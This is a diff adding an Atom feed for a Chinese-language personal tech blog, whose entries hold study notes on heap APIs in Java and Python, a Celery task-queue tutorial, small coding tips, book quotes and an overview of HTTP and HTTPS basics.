@@ -1,0 +1,2590 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh">
+    <title>Obelieve的博客 - Notes</title>
+    <link rel="self" type="application/atom+xml" href="https://obelieve.github.io/categories/notes/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://obelieve.github.io"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2025-11-25T00:00:00+00:00</updated>
+    <id>https://obelieve.github.io/categories/notes/atom.xml</id>
+    <entry xml:lang="zh">
+        <title>编程语言常用的数据结构api</title>
+        <published>2025-11-25T00:00:00+00:00</published>
+        <updated>2025-11-25T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/bian-cheng-yu-yan-chang-yong-de-shu-ju-jie-gou-api/"/>
+        <id>https://obelieve.github.io/blog/bian-cheng-yu-yan-chang-yong-de-shu-ju-jie-gou-api/</id>
+        
+        <content type="html" xml:base="https://obelieve.github.io/blog/bian-cheng-yu-yan-chang-yong-de-shu-ju-jie-gou-api/">&lt;h2 id=&quot;java&quot;&gt;Java&lt;a class=&quot;zola-anchor&quot; href=&quot;#java&quot; aria-label=&quot;Anchor link for: java&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;zui-xiao-dui-priorityqueue&quot;&gt;最小堆 PriorityQueue&lt;a class=&quot;zola-anchor&quot; href=&quot;#zui-xiao-dui-priorityqueue&quot; aria-label=&quot;Anchor link for: zui-xiao-dui-priorityqueue&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;PriorityQueue&amp;lt;Integer&amp;gt; pq = new PriorityQueue&amp;lt;&amp;gt;();
+boolean success = pq.offer(3); &amp;#x2F;&amp;#x2F;添加元素，有返回boolean
+pq.peek(); &amp;#x2F;&amp;#x2F;查看堆顶元素
+Integer removed = pq.poll(); &amp;#x2F;&amp;#x2F;移除堆顶元素
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;python&quot;&gt;Python&lt;a class=&quot;zola-anchor&quot; href=&quot;#python&quot; aria-label=&quot;Anchor link for: python&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;zui-xiao-dui-heapq&quot;&gt;最小堆 heapq&lt;a class=&quot;zola-anchor&quot; href=&quot;#zui-xiao-dui-heapq&quot; aria-label=&quot;Anchor link for: zui-xiao-dui-heapq&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;import heapq
+heap = []
+data = [3,1,4,1,5,9,2]
+heapq.heapify(data) #转为堆结构
+heapq.heappush(data, 5) #添加堆元素
+min_element = heapq.heappop(heap) #弹出堆顶元素
+min_element = heap[0]  # 查看堆顶元素
+heapq.heappush(heap,(value,key)) #key-value关系存到最小堆中， 以value值最小堆排序
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="zh">
+        <title>Celery 分布式任务队列</title>
+        <published>2025-09-04T00:00:00+00:00</published>
+        <updated>2025-09-04T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/celeryku/"/>
+        <id>https://obelieve.github.io/blog/celeryku/</id>
+        
+        <content type="html" xml:base="https://obelieve.github.io/blog/celeryku/">&lt;h2 id=&quot;jing-ji-ren-broker&quot;&gt;经纪人（broker）&lt;a class=&quot;zola-anchor&quot; href=&quot;#jing-ji-ren-broker&quot; aria-label=&quot;Anchor link for: jing-ji-ren-broker&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;需要发送消息&#x2F;接收消息，通过第三方消息代理软件，来实现。&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;RabbitMQ&lt;&#x2F;li&gt;
+&lt;li&gt;Redis&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;#RabbitMQ安装
+#Linux系统
+sudo apt-get install rabbitmq-server
+#Docker
+docker run -d -p 5672:5672 rabbitmq
+#Redis安装
+docker run -d -p 6379:6379 redis
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;an-zhuang&quot;&gt;安装&lt;a class=&quot;zola-anchor&quot; href=&quot;#an-zhuang&quot; aria-label=&quot;Anchor link for: an-zhuang&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;pip install celery
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;jian-dan-li-zi&quot;&gt;简单例子&lt;a class=&quot;zola-anchor&quot; href=&quot;#jian-dan-li-zi&quot; aria-label=&quot;Anchor link for: jian-dan-li-zi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#task.py
+from celery import Celery
+
+#broker 代理消息的软件 、backend 保存任务结果的后端
+app = Celery(&amp;#x27;tasks&amp;#x27;, broker=&amp;#x27;pyamqp:&amp;#x2F;&amp;#x2F;guest@localhost&amp;#x2F;&amp;#x2F; &amp;#x27;,backend=&amp;#x27;rpc:&amp;#x2F;&amp;#x2F;&amp;#x27;)  
+#rabbitMQ  pyamqp:&amp;#x2F;&amp;#x2F;guest@localhost&amp;#x2F;&amp;#x2F; 
+#redis redis:&amp;#x2F;&amp;#x2F;localhost:6379&amp;#x2F;0
+@app.task  
+def add(x, y):  
+    return x + y
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;yun-xing-gong-zuo-fu-wu-qi&quot;&gt;运行工作服务器&lt;a class=&quot;zola-anchor&quot; href=&quot;#yun-xing-gong-zuo-fu-wu-qi&quot; aria-label=&quot;Anchor link for: yun-xing-gong-zuo-fu-wu-qi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;celery -A task worker --loglevel=INFO 
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;diao-yong-ren-wu&quot;&gt;调用任务&lt;a class=&quot;zola-anchor&quot; href=&quot;#diao-yong-ren-wu&quot; aria-label=&quot;Anchor link for: diao-yong-ren-wu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;使用delay调用任务&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from tasks import add
+add.delay(4, 4)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;bao-cun-ren-wu&quot;&gt;保存任务&lt;a class=&quot;zola-anchor&quot; href=&quot;#bao-cun-ren-wu&quot; aria-label=&quot;Anchor link for: bao-cun-ren-wu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Celery 内置了几个结果后端可供选择： SQLAlchemy &#x2F; Django ORM， MongoDB 、 Memcached 、 Redis 、 RPC （ RabbitMQ &#x2F;AMQP）以及 – 或者您可以定义自己的。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#RPC 结果后端 
+#backend=&amp;#x27;rpc:&amp;#x2F;&amp;#x2F;&amp;#x27;
+
+from tasks import add
+result = add.delay(4,4)
+result.ready() #判断结果是否完成
+result.get(timeout=1) #获取结果并设置超时1s
+result.get() #获取结果 
+# result.get(propagate=False) 任务异常时get()也会异常，propagate覆盖操作
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;error&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;AttributeError: &amp;#x27;DisabledBackend&amp;#x27; object has no attribute &amp;#x27;_get_task_meta_for&amp;#x27;. Did you mean: &amp;#x27;get_task_meta_for&amp;#x27;?
+# 解决 重启调用任务的Python
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;pei-zhi&quot;&gt;配置&lt;a class=&quot;zola-anchor&quot; href=&quot;#pei-zhi&quot; aria-label=&quot;Anchor link for: pei-zhi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;# 单个配置
+app.conf.task_serializer = &amp;#x27;json&amp;#x27;
+# update 多个配置
+app.conf.update(
+    task_serializer=&amp;#x27;json&amp;#x27;,
+    accept_content=[&amp;#x27;json&amp;#x27;],  # Ignore other content
+    result_serializer=&amp;#x27;json&amp;#x27;,
+    timezone=&amp;#x27;Europe&amp;#x2F;Oslo&amp;#x27;,
+    enable_utc=True,
+)
+# 配置模块
+app.config_from_object(&amp;#x27;celeryconfig&amp;#x27;)
+celeryconfig.py
+###
+broker_url = &amp;#x27;pyamqp:&amp;#x2F;&amp;#x2F;&amp;#x27;
+result_backend = &amp;#x27;rpc:&amp;#x2F;&amp;#x2F;&amp;#x27;
+
+task_serializer = &amp;#x27;json&amp;#x27;
+result_serializer = &amp;#x27;json&amp;#x27;
+accept_content = [&amp;#x27;json&amp;#x27;]
+timezone = &amp;#x27;Europe&amp;#x2F;Oslo&amp;#x27;
+enable_utc = True
+###
+python -m celeryconfig # 验证配置模块是否正确
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="zh">
+        <title>收集小技巧</title>
+        <published>2025-09-03T00:00:00+00:00</published>
+        <updated>2025-09-03T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/askill/"/>
+        <id>https://obelieve.github.io/blog/askill/</id>
+        
+        <summary type="html">&lt;p&gt;&lt;strong&gt;python ascii-数字转换&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;py&quot; class=&quot;language-py &quot;&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;a = &amp;#x27;a&amp;#x27;
+ord(a) #转数字
+chr(10) #转字符
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;python 双端队列&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;py&quot; class=&quot;language-py &quot;&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;from collections import deque
+a = deque()
+a.append(1)
+a.append(2)
+a.pop()
+a.popleft()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;python 堆结构&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;py&quot; class=&quot;language-py &quot;&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;import heapq
+a = [3,2,1]
+heapq.heapify(a) #最小堆排序
+heapq.heappush(a,4) #添加元素，再次排序
+heapq.heappop(a) #弹出堆顶元素
+
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;shell列出目录树形结构&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;#安装tree
+brew install tree
+#使用tree命令
+tree
+#深层结构
+tree -L 2
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;python 初始化数组&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;py&quot; class=&quot;language-py &quot;&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;res = [&amp;quot;&amp;quot; for _ in range(10)]
+res[0]=&amp;quot;abc&amp;quot;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;</summary>
+        
+    </entry>
+    <entry xml:lang="zh">
+        <title>阅读摘要</title>
+        <published>2025-09-03T00:00:00+00:00</published>
+        <updated>2025-09-18T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/quotes/"/>
+        <id>https://obelieve.github.io/blog/quotes/</id>
+        
+        <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;“多读而不求甚解，则如驰骋十里洋场，虽珍奇满目，徒惹得心花意乱，空手而归。” —— 朱光潜&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;“我记不住我读过的书,就像我记不住我吃过的饭一样;即便如此,它们塑造了我。” —— 爱默生&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;创建较短的反馈回路能协助测量你的进步。找一个实际问题来解决，这是你的学习，跟之于现实世界，从而为你提供一个较大的反馈回路。 《软件开发者路线图-从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;你不应该嫁给任何特定技术，而应该有足够广的技术背景和经验基础，使自己能针对特定的情景选择好的解决方案。《软件开发者路线图-从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;不管哪种方式适合你，都不要忘了问问周围的同道中人和指导者，看是否有人掌握的这项技能，并愿意分享所学有时其他人也可能在学习这项技能，跟他们一起工作，你会获得更快的进步，到某个时刻，你将在这个新领域找到你能满意的，能逆水者，这时你就可以做决定了，是继续深挖下去，更有成效，还是将注意力转移到其他技能空白上。《软件开发者路线图-从学徒到 高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;每天只有24小时，你无法将每一项技能都研磨到很高水平，因此你必须学会在他们中间做必要的权衡。《软件开发者路线图从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在能不能看到的地方学习到可以向别人传授技能期间只差一小步。　《软件开发者路线图从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;技艺意思是使用可能带有装饰性的手法来制作有用的对象，美术的意思则是制作东西纯粹为了使之美丽。　《软件开发者路线图从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;工艺的磨练在于为真能解决实际问题，而不是只为自己踌躇满志。《软件开发者路线图从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;公用和美好并不对立，而是相辅相成。一款软件一有用软件，拥有高质量局又越重要，但质量需要时间来保证。你必须在不断在美好和公园之间折中向着适量的质量级别前进。《软件开发者路线图从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;写下15项能为你提供动力的事情。稍等一会儿再写下另外五项。列出五项最重要的为你提供动力的事情，把这个列表保存在某个地方，遇到困难时可以看看。《软件开发者路线图从学徒到高手》&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;</summary>
+        
+    </entry>
+    <entry xml:lang="zh">
+        <title>关于HTTP</title>
+        <published>2025-01-06T00:00:00+00:00</published>
+        <updated>2025-09-16T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/guan-yu-http/"/>
+        <id>https://obelieve.github.io/blog/guan-yu-http/</id>
+        
+        <content type="html" xml:base="https://obelieve.github.io/blog/guan-yu-http/">&lt;h2 id=&quot;yi-ci-httpqing-qiu-lian-lu-guo-cheng&quot;&gt;一次HTTP请求链路过程&lt;a class=&quot;zola-anchor&quot; href=&quot;#yi-ci-httpqing-qiu-lian-lu-guo-cheng&quot; aria-label=&quot;Anchor link for: yi-ci-httpqing-qiu-lian-lu-guo-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;1.首先是==发送端==通过浏览器输入url链接请求资源，浏览器访问==DNS服务==器查询到IP地址。&lt;&#x2F;li&gt;
+&lt;li&gt;2.传输层通过==TCP协议==对HTTP报文进行分段处理，按编号发送给IP网络层。&lt;&#x2F;li&gt;
+&lt;li&gt;3.网络层通过==IP协议==进行分发数据包。&lt;&#x2F;li&gt;
+&lt;li&gt;4.接收端传输层通过==TCP协议==接收数据包，按编号整合成HTTP数据包。&lt;&#x2F;li&gt;
+&lt;li&gt;5.接收端读取==HTTP数据包==处理请求，并给发送HTTP响应报文。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;tcpsan-ci-wo-shou&quot;&gt;TCP三次握手&lt;a class=&quot;zola-anchor&quot; href=&quot;#tcpsan-ci-wo-shou&quot; aria-label=&quot;Anchor link for: tcpsan-ci-wo-shou&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;首先是发送端==发送SYN（synchronize）==数据包给接收端，
+接收端收到后==回复SYN&#x2F;ACK(acknowledgement)==数据包给发送端，
+然后发送端再==发送ACK==数据包给接收端，连接建立。
+如果中间中断，重新发送。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;tcpduan-kai-lian-jie&quot;&gt;TCP断开连接&lt;a class=&quot;zola-anchor&quot; href=&quot;#tcpduan-kai-lian-jie&quot; aria-label=&quot;Anchor link for: tcpduan-kai-lian-jie&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;首先==接收端发送FIN==数据包给发送端，
+然后==发送端回复ACK==数据包给接收端，
+然后==发送端发送FIN==数据包给接收端，
+最后==接收端回复ACK==数据包给发送端。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu&quot;&gt;URI(统一资源标识符)和URL（统一资源定位符）&lt;a class=&quot;zola-anchor&quot; href=&quot;#uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu&quot; aria-label=&quot;Anchor link for: uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;scheme：协议方案  http: | ftp:&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;http:&#x2F;&#x2F;zxy:123@www.zxy.com&#x2F;path1?a=1#sec1
+方案、认证信息、==服务器地址、端口==、路径、查询信息、片段&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;httpxie-yi-qing-qiu-bao-wen&quot;&gt;HTTP协议请求报文&lt;a class=&quot;zola-anchor&quot; href=&quot;#httpxie-yi-qing-qiu-bao-wen&quot; aria-label=&quot;Anchor link for: httpxie-yi-qing-qiu-bao-wen&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;请求方法(GET &#x2F; POST)  请求资源URI  HTTP协议版本
+请求首部字段 (请求头)
+==空格== ==【CR  0x0d ＋LF 0x0a】==
+请求体&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;httpxie-yi-xiang-ying-bao-wen&quot;&gt;HTTP协议响应报文&lt;a class=&quot;zola-anchor&quot; href=&quot;#httpxie-yi-xiang-ying-bao-wen&quot; aria-label=&quot;Anchor link for: httpxie-yi-xiang-ying-bao-wen&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;HTTP协议版本 响应码 原因短语
+响应首部字段（响应头）
+==空格==
+响应体&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;wang-guan&quot;&gt;网关&lt;a class=&quot;zola-anchor&quot; href=&quot;#wang-guan&quot; aria-label=&quot;Anchor link for: wang-guan&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;能够使通信上的服务器提供非Http协议的服务。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;qing-qiu-tou-jie-shao&quot;&gt;请求头介绍&lt;a class=&quot;zola-anchor&quot; href=&quot;#qing-qiu-tou-jie-shao&quot; aria-label=&quot;Anchor link for: qing-qiu-tou-jie-shao&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;47种首部字段&lt;&#x2F;li&gt;
+&lt;li&gt;通用首部字段 (请求和响应都使用的字段)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Cache-Control 控制缓存的行为
+Connection 逐跳首部、连接的管理
+Date 创建报文的日期时间
+Pragma 报文指令
+Trailer 报文末端的首部一览
+Transfer-Encoding 指定报文主体的传输编码方式
+Upgrade 升级为其他协议
+Via 代理服务器的相关信息
+Warning 错误通知
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;请求首部字段&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Accept 用户代理可处理的媒体类型
+Accept-Charset 优先的字符集
+Accept-Encoding 优先的内容编码
+Accept-Language 优先的语言（自然语言）
+Authorization Web认证信息
+Expect 期待服务器的特定行为
+From 用户的电子邮箱地址
+Host 请求资源所在服务器
+If-Match 比较实体标记（ETag）
+If-Modified-Since 比较资源的更新时间
+If-None-Match 比较实体标记（与If-Match相反）
+If-Range 资源未更新时发送实体Byte的范围请求
+If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）
+Max-Forwards 最大传输逐跳数
+Proxy-Authorization 代理服务器要求客户端的认证信息
+Range 实体的字节范围请求
+Referer 对请求中URI的原始获取方
+TE 传输编码的优先级
+User-Agent HTTP 客户端程序的信息
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;响应首部字段&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Accept-Ranges 是否接受字节范围请求
+Age 推算资源创建经过时间
+ETag 资源的匹配信息
+Location 令客户端重定向至指定URI
+
+Proxy-Authenticate 代理服务器对客户端的认证信息
+Retry-After 对再次发起请求的时机要求
+Server HTTP服务器的安装信息
+Vary 代理服务器缓存的管理信息
+WWW-Authenticate 服务器对客户端的认证信息
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;实体首部字段 (请求报文实体和响应报文实体都使用的字段)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Allow 资源可支持的HTTP方法
+Content-Encoding 实体主体适用的编码方式
+Content-Language 实体主体的自然语言
+Content-Length 实体主体的大小（单位 ：字节）
+Content-Location 替代对应资源的URI
+Content-MD5 实体主体的报文摘要
+Content-Range 实体主体的位置范围
+Content-Type 实体主体的媒体类型
+Expires 实体主体过期的日期时间
+Last-Modified 资源的最后修改日期时间
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;cookiezhuang-tai-zhui-zong-set-cookie&quot;&gt;Cookie状态追踪 ==Set-Cookie==&lt;a class=&quot;zola-anchor&quot; href=&quot;#cookiezhuang-tai-zhui-zong-set-cookie&quot; aria-label=&quot;Anchor link for: cookiezhuang-tai-zhui-zong-set-cookie&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;keep-alive-chi-jiu-lian-jie&quot;&gt;keep-alive 持久连接&lt;a class=&quot;zola-anchor&quot; href=&quot;#keep-alive-chi-jiu-lian-jie&quot; aria-label=&quot;Anchor link for: keep-alive-chi-jiu-lian-jie&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;不用连接一次http请求一次tcp连接。
+只要tcp没断开，继续http请求，不用重新连接tcp。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan&quot;&gt;MIME(Multipurpose Internet Mail Extensions)多用途因特网邮件扩展&lt;a class=&quot;zola-anchor&quot; href=&quot;#mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan&quot; aria-label=&quot;Anchor link for: mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;multipart&#x2F;form-data 表单访问&lt;&#x2F;li&gt;
+&lt;li&gt;multipart&#x2F;byteranges 部分内容访问&lt;&#x2F;li&gt;
+&lt;li&gt;boundary=xx来划分不同数据类型&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Content-Type: multipart&amp;#x2F;form-data; boundary=xx
+--xx
+--xx
+--xx--
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;bu-fen-nei-rong-qing-qiu-huo-qu&quot;&gt;部分内容请求获取&lt;a class=&quot;zola-anchor&quot; href=&quot;#bu-fen-nei-rong-qing-qiu-huo-qu&quot; aria-label=&quot;Anchor link for: bu-fen-nei-rong-qing-qiu-huo-qu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;==Range: bytes==请求头
+==Range: bytes== =1-5000, 5000-&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;nei-rong-xie-shang&quot;&gt;内容协商&lt;a class=&quot;zola-anchor&quot; href=&quot;#nei-rong-xie-shang&quot; aria-label=&quot;Anchor link for: nei-rong-xie-shang&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;==Access==请求头&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;https&quot;&gt;HTTPS&lt;a class=&quot;zola-anchor&quot; href=&quot;#https&quot; aria-label=&quot;Anchor link for: https&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;shu-zi-qian-ming&quot;&gt;数字签名&lt;a class=&quot;zola-anchor&quot; href=&quot;#shu-zi-qian-ming&quot; aria-label=&quot;Anchor link for: shu-zi-qian-ming&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;利用非对称加密算法，拿==私钥对摘要信息进行加密==，然后公钥进行解密验证信息。
+最重要的是非对称加密算法特性，==私钥和公钥是一对好CP==。一方加密，另一方就解密。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;shu-zi-zheng-shu&quot;&gt;数字证书&lt;a class=&quot;zola-anchor&quot; href=&quot;#shu-zi-zheng-shu&quot; aria-label=&quot;Anchor link for: shu-zi-zheng-shu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;用于证明==公钥的合法性==，使用私钥对数字签名的公钥进行加密。&lt;&#x2F;p&gt;
